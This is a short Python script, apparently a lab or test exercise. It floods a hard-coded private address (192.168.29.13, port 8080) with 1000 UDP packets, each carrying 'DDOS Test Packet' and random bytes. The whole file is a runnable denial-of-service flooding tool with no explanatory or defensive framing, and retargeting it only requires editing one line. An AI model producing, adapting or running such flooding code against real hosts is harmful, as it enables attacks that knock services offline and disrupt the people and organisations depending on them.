import socket
import random
import time

target_ip = "192.168.29.13"
target_port = 8080
message = b"DDOS Test Packet"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(f"Flooding {target_ip}:{target_port}")
for i in range(1000):
    sock.sendto(message + bytes(random.randint(0, 255)
                for _ in range(20)), (target_ip, target_port))
    time.sleep(0.01)
